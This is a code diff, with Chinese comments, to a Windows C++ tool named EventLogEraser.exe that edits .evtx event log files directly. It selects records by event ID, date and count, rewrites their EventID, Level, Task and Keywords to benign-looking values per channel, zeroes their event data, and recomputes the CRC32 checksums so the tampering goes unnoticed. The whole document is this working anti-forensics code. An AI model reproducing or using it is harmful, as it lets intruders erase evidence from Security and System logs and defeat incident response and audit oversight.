@@ -7,20 +7,20 @@
 
 // #define DEBUG
 
-#define TARGET_EVENT_ID 4728
-
 #define EVENT_NAME_HASH 0x0CBA
 #define SYSTEM_NAME_HASH 0x546F
-#define EVENTID_NAME_HASH 0x61F5
 #define USERDATA_NAME_HASH 0x4435
-#define EVENTDATA_NAME_HASH 0x2844
+#define EVENTDATA_NAME_HASH 0x8244
 // EventData标签的嵌入方式有点特别，详见
 // https://github.com/wqreytuk/windows_event_log_study/blob/main/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3record%E6%A0%BC%E5%BC%8F%EF%BC%8C%E7%A4%BA%E4%BE%8B%E5%88%86%E6%9E%90.md#%E6%B3%A8%E6%84%8F
-#define EVENTDATA_NAME_HASH 0x8244
 // 我们感兴趣的tag [OutterTemplate]
 #define TASK_NAME_HASH 0x7B45
 #define LEVEL_NAME_HASH 0xCE64
-#define COMPUTER_NAME_HASH 0x6E3B
+// 我现在不想处理ComputerName了，这个标签正确的hash是0x6E3B
+#define COMPUTER_NAME_HASH 0x0000
+#define KEYWORDS_NAME_HASH 0xCF6A
+#define EVENTID_NAME_HASH 0x61F5
+
 // 我们感兴趣的tag [InnerTemplate]
 // 只有一个，就是Data标签，因为InnerTemplate只有Data标签
 #define DATA_NAME_HASH 0x6F8A
@@ -29,6 +29,14 @@
 #define CHILD_END 0x0404
 
 #define ENTRY_NUMBER 1024
+
+typedef
+DWORD
+(NTAPI* PNT_RtlComputeCrc32)(
+    DWORD       dwInitial,
+    CONST BYTE* pData,
+    INT         iLen
+    );
 
 typedef struct _TemplateInstace {
     BYTE    _template_instance_token;
@@ -67,13 +75,33 @@ DWORD _Template_OFS_TABLE[ENTRY_NUMBER];    // outter template
 DWORD _INNER_Template_OFS_TABLE[ENTRY_NUMBER];  // inner template
 
 // templatedef中的关键tag的SubstitutionID
-DWORD64 _Substitution_ID_TABLE[ENTRY_NUMBER][5];
+DWORD64 _Substitution_ID_TABLE[ENTRY_NUMBER][6];
 /*
-EVENTID | EVENTDATA | COMPUTER | LEVEL | TASK
+EVENTID | EVENTDATA | COMPUTER | LEVEL | TASK | KEYWORDS
 */
 // table index
 WORD _table_index;
 WORD _inner_table_index; // _INNER_Template_OFS_TABLE
+
+/*
+我们主要针对3个频道：Application、Security、System
+下面是每个频道各个标签推荐的修改值
+Task：       0、13826、0
+Level：      4、不作处理、4
+Keywords：   不做处理、0x8020000000000000（8bytes）、不做处理
+EventID：    1003、4799、32
+*/
+typedef struct _Channel_Value {
+    WORD _task;
+    BYTE _level;
+    DWORD64 _key_words;
+    WORD _event_id;
+}ChannelValue, PChannelBValue;
+ChannelValue _Channel_Value_Table[3] = {
+    {0,4,0xFFFFFFFFFFFFFFFF,1003},
+    {13826,0xFF,0x8020000000000000,4799},
+    {0,4,0xFFFFFFFFFFFFFFFF,32}
+};
 
 DWORD64 return_step_by_type(BYTE* _base, BYTE _type) {
     if (_type == 0x1) {
@@ -126,7 +154,7 @@ DWORD64 iterate_attribute_list(BYTE* _base, DWORD64 _template_def_offset, DWORD6
     return _init_ofs;
 }
 
-DWORD64 deal_target_tag(HANDLE _file_handle,DWORD64 _current_chunk,
+DWORD64 deal_target_tag(HANDLE _file_handle, DWORD64 _current_chunk,
     DWORD64 _template_def_offset, DWORD64 _ofs_in_template, BOOL* _p_is_reference_offset,
     BYTE* _chunk_buffer, PStartElement _start_element, PTagName _tag_name) {
     BOOL _is_reference_offset = *_p_is_reference_offset;
@@ -157,6 +185,10 @@ DWORD64 deal_target_tag(HANDLE _file_handle,DWORD64 _current_chunk,
         printf("\t\tTask tag name located at: 0x%p\n", reinterpret_cast<BYTE*>(0x1000 + 0x10000 * _current_chunk + _template_def_offset + _ofs_in_template));
         _column_index = 4;
     }
+    else if (!(_tag_name->_name_hash ^ KEYWORDS_NAME_HASH)) {
+        printf("\t\tKeywords tag name located at: 0x%p\n", reinterpret_cast<BYTE*>(0x1000 + 0x10000 * _current_chunk + _template_def_offset + _ofs_in_template));
+        _column_index = 5;
+    }
     if (!_is_reference_offset) {
         _ofs_in_template += ((DWORD64)_tag_name->_unicode_string_length + 1) * 2;
     }
@@ -176,7 +208,7 @@ DWORD64 deal_target_tag(HANDLE _file_handle,DWORD64 _current_chunk,
         // 直接记录下Computer标签值的准确地址
         _Substitution_ID_TABLE[_table_index][_column_index] = 0x1000 + 0x10000 * _current_chunk + _template_def_offset + _ofs_in_template;
         // len和unicode
-        _ofs_in_template += ((DWORD64)*reinterpret_cast<WORD*>(_chunk_buffer + _template_def_offset + _ofs_in_template) + 1) * 2;
+        _ofs_in_template += ((DWORD64) * reinterpret_cast<WORD*>(_chunk_buffer + _template_def_offset + _ofs_in_template) + 1) * 2;
         // EndElementToken 
         _ofs_in_template += 0x1;
         return _ofs_in_template;
@@ -187,11 +219,15 @@ DWORD64 deal_target_tag(HANDLE _file_handle,DWORD64 _current_chunk,
         if (0xE != *reinterpret_cast<BYTE*>(_chunk_buffer + _template_def_offset + _ofs_in_template)) {
             // 写入文件
             // 重置文件指针
-            SetFilePointer(_file_handle, 0x1000 + 0x10000 * (LONG)_current_chunk + _template_def_offset + _ofs_in_template, NULL, FILE_BEGIN);
+#ifdef DEBUG
+            printf("[DEBUG] location of token to be replaced: 0x%p\n", reinterpret_cast<BYTE*>(0x1000 + 0x10000 * (DWORD64)_current_chunk + _template_def_offset + _ofs_in_template));
+#endif 
+
+            SetFilePointer(_file_handle, (LONG)(0x1000 + 0x10000 * _current_chunk + _template_def_offset + _ofs_in_template), NULL, FILE_BEGIN);
             BYTE _token = 0xE;
             DWORD _out = 0;
             if (!WriteFile(_file_handle, &_token, 1, &_out, NULL)) {
-                printf("[-] write evtx file failed, abort...\n");
+                printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
                 exit(-1);
             }
         }
@@ -217,9 +253,9 @@ DWORD64 deal_target_tag(HANDLE _file_handle,DWORD64 _current_chunk,
     return _ofs_in_template;
 }
 
-VOID iterateTag(HANDLE _file_handle,BYTE* _chunk_buffer, PTemplateInstace _template_instance,
-    DWORD64 _ofs_in_template,WORD _expect_table_entry, DWORD64 _current_chunk,
-    WORD _end_mark){
+VOID iterateTag(HANDLE _file_handle, BYTE* _chunk_buffer, PTemplateInstace _template_instance,
+    DWORD64 _ofs_in_template, WORD _expect_table_entry, DWORD64 _current_chunk,
+    WORD _end_mark) {
     while (!(_expect_table_entry ^ 0xFFFF)) {
 #ifdef DEBUG
         printf("[DEBUG] offset in template: 0x%p\n", reinterpret_cast<BYTE*>(_ofs_in_template));
@@ -229,10 +265,11 @@ VOID iterateTag(HANDLE _file_handle,BYTE* _chunk_buffer, PTemplateInstace _templ
         BOOL _is_reference_offset = FALSE;
 #ifdef DEBUG
         printf("[DEBUG] consecutive token: 0x%p\n", reinterpret_cast<BYTE*>(*reinterpret_cast<WORD*>(_chunk_buffer + _template_instance->_template_def_offset + _ofs_in_template)));
+        printf("[DEBUG] [INNERTEMPLATE] consecutive token: 0x%p\n", reinterpret_cast<BYTE*>(*reinterpret_cast<WORD*>(_chunk_buffer + _template_instance->_template_def_offset + _ofs_in_template - 1)));
 #endif 
         if (_end_mark == CHILD_END) {
             // 如果碰到连续的两个TOKEN，0x4和0x4，说明EvenData模板已经遍历完了，直接跳出即可
-            if (_end_mark == *reinterpret_cast<WORD*>(_chunk_buffer + _template_instance->_template_def_offset + _ofs_in_template-1)) // 这里-1是对eventdata的特殊处理
+            if (_end_mark == *reinterpret_cast<WORD*>(_chunk_buffer + _template_instance->_template_def_offset + _ofs_in_template - 1)) // 这里-1是对eventdata的特殊处理
                 break;
         }
         if (_end_mark == *reinterpret_cast<WORD*>(_chunk_buffer + _template_instance->_template_def_offset + _ofs_in_template)) {
@@ -279,7 +316,7 @@ VOID iterateTag(HANDLE _file_handle,BYTE* _chunk_buffer, PTemplateInstace _templ
             // CloseStartElementToken
             _ofs_in_template += 0x1;
         }
-        else if (!((_tag_name._name_hash ^ EVENTID_NAME_HASH) * (_tag_name._name_hash ^ USERDATA_NAME_HASH) * (_tag_name._name_hash ^ COMPUTER_NAME_HASH) * (_tag_name._name_hash ^ LEVEL_NAME_HASH) * (_tag_name._name_hash ^ TASK_NAME_HASH))) {
+        else if (!((_tag_name._name_hash ^ EVENTID_NAME_HASH) * (_tag_name._name_hash ^ USERDATA_NAME_HASH) * (_tag_name._name_hash ^ COMPUTER_NAME_HASH) * (_tag_name._name_hash ^ LEVEL_NAME_HASH) * (_tag_name._name_hash ^ TASK_NAME_HASH) * (_tag_name._name_hash ^ KEYWORDS_NAME_HASH))) {
             _ofs_in_template = deal_target_tag(_file_handle, _current_chunk, _template_instance->_template_def_offset, _ofs_in_template, &_is_reference_offset, _chunk_buffer, &_start_element, &_tag_name);
             // 如果返回值为0，说明当前处理的节点为EventData，所有我们关心的tag已经处理完毕
             // 直接跳出循环即可
@@ -321,10 +358,146 @@ BYTE* retrieve_value_address(BYTE* _chunk_buffer, DWORD64 _substitution_id, DWOR
     return _chunk_buffer + _real_data_offset + _step_over;
 }
 
+BOOL is_condition_match(WORD _event_id, DWORD64 _record_time_stamp_RAW, WORD _target_event_id, DWORD64 _start_timestamp) {
+    if (_target_event_id) {
+        if (_target_event_id == _event_id)
+            if (_start_timestamp)
+                if (_record_time_stamp_RAW > _start_timestamp)
+                    return TRUE;
+                else
+                    return FALSE;
+            else
+                return TRUE;
+    }
+    else
+        if (_record_time_stamp_RAW > _start_timestamp)
+            return TRUE;
+    return FALSE;
+}
+
+VOID recalculate_crc(HANDLE _file_handle, PNT_RtlComputeCrc32 NT_RtlComputeCrc32,
+    BYTE* _chunk_buffer, DWORD64 _current_chunk) {
+    // 需要先把缓冲区中的数据写到文件中，然后重新读入chunk，因为我们前面的修改是直接修改的
+    // 文件内容，并没有修改buffer
+    if (!FlushFileBuffers(_file_handle)) {
+        printf("[-] error flushing file buffers: %x\n", GetLastError());
+        exit(-1);
+    }
+    // 重新读入
+    ZeroMemory(_chunk_buffer, 0x10000);
+    SetFilePointer(_file_handle, 0x1000 + 0x10000 * (LONG)_current_chunk, NULL, FILE_BEGIN);
+    DWORD _out = 0;
+    if (!ReadFile(_file_handle,
+        _chunk_buffer,
+        0x10000,
+        &_out,
+        NULL
+    )) {
+        printf("[-] read evtx file failed: %x, abort...\n", GetLastError());
+        exit(-1);
+    }
+
+    DWORD _record_new_crc = NT_RtlComputeCrc32(0, _chunk_buffer + 0x200, *(reinterpret_cast<DWORD*>(_chunk_buffer + 0x30)) - 0x200);
+    SetFilePointer(_file_handle, (LONG)(0x1000 + 0x10000 * _current_chunk + 0x34), NULL, FILE_BEGIN);
+    _out = 0;
+    if (!WriteFile(_file_handle, &_record_new_crc, 4, &_out, NULL)) {
+        printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
+        exit(-1);
+    }
+    *reinterpret_cast<DWORD*>(_chunk_buffer + 0x34) = _record_new_crc;
+    DWORD _elfchunk_new_crc = NT_RtlComputeCrc32(NT_RtlComputeCrc32(0, _chunk_buffer, 0x78), _chunk_buffer + 0x80, 0x200 - 0x80);
+    SetFilePointer(_file_handle, (LONG)(0x1000 + 0x10000 * _current_chunk + 0x7C), NULL, FILE_BEGIN);
+    _out = 0;
+    if (!WriteFile(_file_handle, &_elfchunk_new_crc, 4, &_out, NULL)) {
+        printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
+        exit(-1);
+    }
+    // *reinterpret_cast<DWORD*>(_chunk_buffer + 0x7C) = _elfchunk_new_crc;
+    if (!FlushFileBuffers(_file_handle)) {
+        printf("[-] error flushing file buffers: %x\n", GetLastError());
+        exit(-1);
+    }
+}
 // 获取日志文件中所有记录的eventid并输出
-int main() {
+int main(int argc, char* argv[]) {
+    if (argc != 6) {
+        printf("[*] usage:\n\tEventLogEraser.exe path\\to\\evtx channel target_event_id date number\n\n");
+        printf("\tchannel value:\n");
+        printf("\t\t1 for Application\n");
+        printf("\t\t2 for Security\n");
+        printf("\t\t3 for System\n\n");
+        printf("\ttarget_event_id value [all events match this id will gone, omit this option by specify 0]\n\n");
+        printf("\tdate value: [all events after this date will gone, omit this option by specify 0]\n");
+        printf("\t\tMM/DD/YYYY-hh:mm:ss\n\n");
+        printf("\tnumber value [maxmium number of events to be erased]\n");
+        return 0;
+    }
+    WORD _already_erased_counter = 0;
+    BOOL _omit_event_id = FALSE;
+    BOOL _omit_date = FALSE;
+    BYTE _channel = (BYTE)atoi(argv[2]) - 1;
+    WORD _target_event_id = (WORD)atoi(argv[3]);
+    if (!_target_event_id)
+        _omit_event_id = TRUE;
+    WORD _max_number = (WORD)atoi(argv[5]);
+    if (!_max_number || _max_number > 0xFFFF) {
+        printf("[-] invalid number value\n");
+        exit(-1);
+    }
+    DWORD64 _start_timestamp = 0;
+    // 用户提供的日期值为0
+    if (strlen(argv[4]) == 1) {
+        if (_omit_event_id) {
+            printf("[-] you can't omit both of target_event_id and date\n");
+            exit(-1);
+        }
+        printf("[CAUTION] you may want to specify a start date, because I'm erasing log from the oldest record\n");
+        printf("[ENTER YES IF YOU WANT TO CONITNUE ANYWAY]: ");
+        char _user_answer[10] = { 0 };
+        scanf_s("%s", _user_answer, 10);
+        if (0!=strcmp(_user_answer, "YES")) {
+            printf("ABORT\n");
+            exit(-1);
+        }
+    }
+    else {
+        // 转换时间为时间戳
+        SYSTEMTIME st = { 0 }, stUTC = { 0 };
+        int _1, _2, _3, _4, _5, _6;
+        if (sscanf_s(argv[4], "%02d/%02d/%04d-%02d:%02d:%02d",
+            &_1, &_2, &_3, &_4, &_5, &_6) != 6) {
+            printf("[-] invalid date format\n");
+            exit(-1);
+        }
+        st.wMonth = (WORD)_1;
+        st.wDay = (WORD)_2;
+        st.wYear = (WORD)_3;
+        st.wHour = (WORD)_4;
+        st.wMinute = (WORD)_5;
+        st.wSecond = (WORD)_6;
+
+        FILETIME ft;
+        if (!TzSpecificLocalTimeToSystemTime(NULL, &st, &stUTC)) {
+            printf("[-] error converting to local time: %x, abort...\n", GetLastError());
+            exit(-1);
+        }
+        SystemTimeToFileTime(&stUTC, &ft);
+        ULARGE_INTEGER uli;
+        uli.LowPart = ft.dwLowDateTime;
+        uli.HighPart = ft.dwHighDateTime;
+        _start_timestamp = uli.QuadPart;
+    }
+
+    // 获取RtlComputeCrc32函数
+    HMODULE _ntdll_module = GetModuleHandleA("ntdll.dll");
+    if (0 == _ntdll_module) {
+        printf("[-] failed to get ntdll base address: %x, abort...\n", GetLastError());
+        exit(-1);
+    }
+    PNT_RtlComputeCrc32 NT_RtlComputeCrc32 = (PNT_RtlComputeCrc32)GetProcAddress(_ntdll_module, "RtlComputeCrc32");
+
     // 打开文件，逐个chunk进行遍历
-    HANDLE _file_handle = CreateFileA("C:\\Users\\123\\Documents\\asdasdasdasdad1.evtx",
+    HANDLE _file_handle = CreateFileA(argv[1],
         GENERIC_ALL,
         0,
         NULL,
@@ -332,14 +505,14 @@ int main() {
         FILE_ATTRIBUTE_NORMAL,
         NULL);
     if ((DWORD64)_file_handle == -1) {
-        printf("[-] open evtx file failed, abort...\n");
+        printf("[-] open evtx file failed: %x, abort...\n", GetLastError());
         return -1;
     }
 
     // 从elfheader中读取出下一条record的序号，-1即可获得最后一条record的序号
     BYTE* _elffile_header_buffer = (BYTE*)malloc(0x20);
     if (0 == _elffile_header_buffer) {
-        printf("[-] odd! memory allocate failed, abort...\n");
+        printf("[-] odd! memory allocate failed: %x, abort...\n", GetLastError());
         exit(-1);
     }
     ZeroMemory(_elffile_header_buffer, 0x20);
@@ -350,7 +523,7 @@ int main() {
         &_out,
         NULL
     )) {
-        printf("[-] read evtx file failed, abort...\n");
+        printf("[-] read evtx file failed: %x, abort...\n", GetLastError());
         return -1;
     }
     DWORD64 _last_record_sequence_number = *reinterpret_cast<DWORD64*>(_elffile_header_buffer + 0x18) - 1;
@@ -367,7 +540,7 @@ int main() {
     // 直接将整个chunk读入内存，一个chunk占65KB
     BYTE* _chunk_buffer = (BYTE*)malloc(0x10000);
     if (0 == _chunk_buffer) {
-        printf("[-] odd! memory allocate failed, abort...\n");
+        printf("[-] odd! memory allocate failed: %x, abort...\n", GetLastError());
         exit(-1);
     }
     while (1) {
@@ -388,7 +561,7 @@ int main() {
             &_out,
             NULL
         )) {
-            printf("[-] read evtx file failed, abort...\n");
+            printf("[-] read evtx file failed: %x, abort...\n", GetLastError());
             return -1;
         }
         // 0x8偏移是当前chunk中第一条record的序号，0x10偏移是当前chunk中最后一条record的序号，
@@ -408,6 +581,7 @@ int main() {
             printf("[DEBUG] _record_length: 0x%p\n", reinterpret_cast<BYTE*>((DWORD64)_record_length));
 #endif
             FILETIME _record_time_stamp = *reinterpret_cast<FILETIME*>(_chunk_buffer + _record_offset_sum + 0x10);
+            DWORD64 _record_time_stamp_RAW = *reinterpret_cast<DWORD64*>(_chunk_buffer + _record_offset_sum + 0x10);
             SYSTEMTIME stUTC, stLocal;
             FileTimeToSystemTime(&_record_time_stamp, &stUTC);
             SystemTimeToTzSpecificLocalTime(NULL, &stUTC, &stLocal);
@@ -416,10 +590,10 @@ int main() {
                 TEXT("%02d/%02d/%d  %02d:%02d:%02d"),
                 stLocal.wMonth, stLocal.wDay, stLocal.wYear,
                 stLocal.wHour, stLocal.wMinute, stLocal.wSecond)) {
-                printf("[-] filetime convert failed, abort...\n");
+                printf("[-] filetime convert failed: %x, abort...\n", GetLastError());
                 exit(-1);
             }
-            _tprintf(TEXT("\t\ttime stamp: %s\n"), szBuf);
+            _tprintf(TEXT("\t\ttime stamp: %s\n\n"), szBuf);
 
             // 下面我们就要开始解析binxml了
             DWORD64 _ofs_in_record = _record_offset_sum;
@@ -493,7 +667,7 @@ int main() {
                 _current_index = _expect_table_entry;
 
             // 获取EventID标签值的地址
-            WORD _event_id = * reinterpret_cast<WORD*>(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][0], _iterate_start, _real_data_offset));
+            WORD _event_id = *reinterpret_cast<WORD*>(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][0], _iterate_start, _real_data_offset));
             printf("\t\tevent id: 0x%p\n\n", reinterpret_cast<BYTE*>((DWORD64)_event_id));
             // 获取EventData的地址
             DWORD64 _event_data_addr = 0;
@@ -503,11 +677,14 @@ int main() {
                 _event_data_addr = _addr - _chunk_buffer;
             }
             // Computer标签的准确地址
-            printf("\t\tComputer tag value address: 0x%p\n\n", reinterpret_cast<BYTE*>(_Substitution_ID_TABLE[_current_index][2]));
+            // printf("\t\tComputer tag value address: 0x%p\n\n", reinterpret_cast<BYTE*>(_Substitution_ID_TABLE[_current_index][2]));
             // 获取Level的地址
             printf("\t\tevent level: 0x%p\n\n", reinterpret_cast<BYTE*>((DWORD64) * reinterpret_cast<BYTE*>(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][3], _iterate_start, _real_data_offset))));
             // 获取Task的地址
             printf("\t\tevent task: 0x%p\n\n", reinterpret_cast<BYTE*>((DWORD64) * reinterpret_cast<WORD*>(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][4], _iterate_start, _real_data_offset))));
+            // 获取Keywords的地址
+            printf("\t\tkeywords: 0x%p\n\n", reinterpret_cast<BYTE*>(*reinterpret_cast<DWORD64*>(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][5], _iterate_start, _real_data_offset))));
+
 
             // 解析InnerTemplate（如果存在我们感兴趣的innertamplate的话）
             // InstanceDataDef实际数据后面的部分是填充，可以直接忽略
@@ -553,7 +730,40 @@ int main() {
                 iterateTag(_file_handle, _chunk_buffer, &_inner_template_instance, _ofs_in_template, _expect_table_entry, _current_chunk, CHILD_END);
 
                 // 如果是目标EventID，则执行下面的操作
-                if (_event_id == TARGET_EVENT_ID) {
+                if (is_condition_match(_event_id, _record_time_stamp_RAW, _target_event_id, _start_timestamp)) {
+                    // 修改eventid
+                    SetFilePointer(_file_handle, (LONG)(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][0], _iterate_start, _real_data_offset) - _chunk_buffer + 0x1000 + 0x10000 * _current_chunk), NULL, FILE_BEGIN);
+                    DWORD _out = 0;
+                    if (_Channel_Value_Table[_channel]._event_id ^ 0xFFFF)
+                        if (!WriteFile(_file_handle, &_Channel_Value_Table[_channel]._event_id, 2, &_out, NULL)) {
+                            printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
+                            exit(-1);
+                        }
+                    // 修改keywords
+                    SetFilePointer(_file_handle, (LONG)(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][5], _iterate_start, _real_data_offset) - _chunk_buffer + 0x1000 + 0x10000 * _current_chunk), NULL, FILE_BEGIN);
+                    _out = 0;
+                    if (_Channel_Value_Table[_channel]._key_words ^ 0xFFFFFFFFFFFFFFFF)
+                        if (!WriteFile(_file_handle, &_Channel_Value_Table[_channel]._key_words, 8, &_out, NULL)) {
+                            printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
+                            exit(-1);
+                        }
+                    // 修改level
+                    SetFilePointer(_file_handle, (LONG)(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][3], _iterate_start, _real_data_offset) - _chunk_buffer + 0x1000 + 0x10000 * _current_chunk), NULL, FILE_BEGIN);
+                    _out = 0;
+                    if (_Channel_Value_Table[_channel]._level ^ 0xFF)
+                        if (!WriteFile(_file_handle, &_Channel_Value_Table[_channel]._level, 1, &_out, NULL)) {
+                            printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
+                            exit(-1);
+                        }
+                    // 修改task
+                    SetFilePointer(_file_handle, (LONG)(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][4], _iterate_start, _real_data_offset) - _chunk_buffer + 0x1000 + 0x10000 * _current_chunk), NULL, FILE_BEGIN);
+                    _out = 0;
+                    if (_Channel_Value_Table[_channel]._task ^ 0xFFFF)
+                        if (!WriteFile(_file_handle, &_Channel_Value_Table[_channel]._task, 2, &_out, NULL)) {
+                            printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
+                            exit(-1);
+                        }
+
                     // 现在我们需要处理data部分了
                     DWORD _data_counter = *reinterpret_cast<DWORD*>(_chunk_buffer + _template_instance_data_offset);
                     // 获取原始数据的长度
@@ -563,44 +773,60 @@ int main() {
                     while (1) {
                         if (_counter == _data_counter)
                             break;
-                        _ori_data_len += (*reinterpret_cast<DWORD*>(_chunk_buffer + _iterate_start + (DWORD64)4 * _counter++)) & 0xFF00;
+                        _ori_data_len += (*reinterpret_cast<DWORD*>(_chunk_buffer + _iterate_start + (DWORD64)4 * _counter++)) & 0xFF;
                     }
                     // 我们先把def部分清空
-                    SetFilePointer(_file_handle, 0x1000 + 0x10000 * _current_chunk + _template_instance_data_offset + 0x4, NULL, FILE_BEGIN);
+#ifdef DEBUG
+                    printf("[DEBUG] file pointer: 0x%p\n", reinterpret_cast<DWORD*>(0x1000 + 0x10000 * _current_chunk + _template_instance_data_offset + 0x4));
+#endif 
+
+                    SetFilePointer(_file_handle, (LONG)(0x1000 + 0x10000 * _current_chunk + _template_instance_data_offset + 0x4), NULL, FILE_BEGIN);
                     BYTE* _padding = (BYTE*)malloc(_ori_data_len);
                     if (0 == _padding) {
-                        printf("[-] odd! memory allocate failed, abort...\n");
+                        printf("[-] odd! memory allocate failed: %x, abort...\n", GetLastError());
                         exit(-1);
                     }
-                    DWORD _out = 0;
+                    _out = 0;
                     ZeroMemory(_padding, _ori_data_len);
                     if (!WriteFile(_file_handle, _padding, _data_counter * 4, &_out, NULL)) {
-                        printf("[-] write evtx file failed, abort...\n");
+                        printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
                         exit(-1);
                     }
                     free(_padding);
                     // 然后把data部分清空
-                    SetFilePointer(_file_handle, 0x1000 + 0x10000 * _current_chunk + _template_instance_data_offset + 0x4 + 4 * (DWORD64)_data_counter, NULL, FILE_BEGIN);
+                    SetFilePointer(_file_handle, (LONG)(0x1000 + 0x10000 * _current_chunk + _template_instance_data_offset + 0x4 + 4 * (DWORD64)_data_counter), NULL, FILE_BEGIN);
                     _out = 0;
                     _padding = (BYTE*)malloc(_ori_data_len);
                     if (0 == _padding) {
-                        printf("[-] odd! memory allocate failed, abort...\n");
+                        printf("[-] odd! memory allocate failed: %x, abort...\n", GetLastError());
                         exit(-1);
                     }
                     ZeroMemory(_padding, _ori_data_len);
                     if (!WriteFile(_file_handle, _padding, _ori_data_len, &_out, NULL)) {
-                        printf("[-] write evtx file failed, abort...\n");
+                        printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
                         exit(-1);
                     }
                     free(_padding);
+
+                    _already_erased_counter++;
+                    if (_already_erased_counter == _max_number) {
+                        printf("[+] all target events have been erased\n");
+                        recalculate_crc(_file_handle, NT_RtlComputeCrc32, _chunk_buffer, _current_chunk);
+                        printf("[+] total 0x%p erased\n\n", reinterpret_cast<DWORD*>((DWORD64)_already_erased_counter));
+                        free(_chunk_buffer);
+                        CloseHandle(_file_handle);
+                        printf("[+] DONE!\n");
+                        exit(0);
+                    }
                 }
             }
 
             if (_record_sequence_number == _last_record_sequence_number_in_current_chunk) {
                 printf("[+] all records in current chunk have been checked out\n\n");
+                // 重新计算elfchunk的CRC
+                recalculate_crc(_file_handle, NT_RtlComputeCrc32, _chunk_buffer, _current_chunk);
                 break;
             }
-            // 重置文件指针
             _record_offset_sum += _record_length;
         }
         // 当前chunk遍历完成后应该重置所有的表及index，因为不存在跨chunk的引用
@@ -609,6 +835,7 @@ int main() {
         _table_index = 0;
         // 判断是否已经遍历完了所有的chunk
         if (_record_sequence_number == _last_record_sequence_number) {
+            printf("[+] total 0x%p erased\n\n", reinterpret_cast<DWORD*>((DWORD64)_already_erased_counter));
             printf("[+] DONE!\n");
             break;
         }
